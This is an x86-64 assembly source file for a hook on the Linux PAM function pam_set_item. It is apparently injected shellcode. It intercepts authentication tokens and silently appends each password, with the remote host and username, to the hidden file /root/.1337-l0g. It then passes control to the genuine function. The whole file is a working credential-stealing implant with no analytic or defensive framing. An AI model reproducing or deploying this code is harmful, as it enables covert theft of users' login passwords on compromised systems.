%define sys_write 1
%define sys_open  2
%define sys_close 3

%define O_CLOEXEC 0x80000
%define O_APPEND  0x400
%define O_CREAT   0x40
%define O_RDWR    0x2

%define PAM_AUTHTOK 6

BITS 64
    pam_set_item: dq 0
_start:
    cmp rsi, PAM_AUTHTOK
    jne end

    test rdx, rdx
    je end

    push rdi
    push rsi
    push rdx

    xor rdi, rdi
    mul rdi

    mov al, sys_open
    mov rsi, O_RDWR|O_CREAT|O_CLOEXEC|O_APPEND
    lea rdi, [rel filename]
    mov dx, 0644
    syscall
    js restore

    push rax

    mov rdi, [rsp+8]
    call strlen

    xor rax, rax
    mov al, sys_write
    mov rdi, [rsp]
    mov rsi, [rsp+8]
    syscall

    ;;; 56      48
    ;;; rhost - user

    mov r10, [rsp+24]
    xor r9, r9
    mov r9, 56

    jmp breakline

    loop:
    mov rsi, r10
    add rsi, r9
    mov rsi, [rsi]
    test rsi, rsi
    jz decr9

    mov rdi, rsi
    call strlen

    xor rax, rax
    mov al, sys_write
    mov rdi, [rsp]
    syscall

    decr9:
    sub r9, 8

    breakline:
    xor rax, rax
    xor rdx, rdx
    mov al, sys_write
    inc rdx
    lea rsi, [rel bline]
    syscall

    cmp r9, 40
    jne loop

    ;;; end of loop

    add rsp, 8
    restore:
    pop rdx
    pop rsi
    pop rdi

    end:
    mov r10, [rel pam_set_item]
    jmp r10

    filename: db '/root/.1337-l0g', 0x0
    bline: db 0xa

strlen:
    xor rcx, rcx
    not rcx
    xor al, al
    cld
    repne scasb
    not rcx
    dec rcx
    mov rdx, rcx
    ret
